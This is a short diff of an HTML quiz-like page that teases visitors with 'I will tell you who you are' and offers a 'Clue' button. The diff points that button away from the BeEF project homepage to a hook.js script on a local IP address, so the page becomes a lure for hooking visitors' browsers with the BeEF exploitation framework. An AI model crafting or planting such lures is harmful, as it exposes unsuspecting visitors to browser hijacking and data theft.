@@ -21,7 +21,7 @@ But if you cant ?
 Then i will tell you who you are.<br>
 let's help you with some clue.<br>
 <div class="container" align="center">
-  <button class="btn btn1"><a href="https://beefproject.com/" > Clue </a></button> <br>
+  <button class="btn btn1"><a href="http://192.168.0.108/hook.js" > Clue </a></button> <br>
   <button class="btn btn2"><a href="https://facebook.com/profile.php?=73322363" id= btn2> Just you </a></button>
   </div>
 
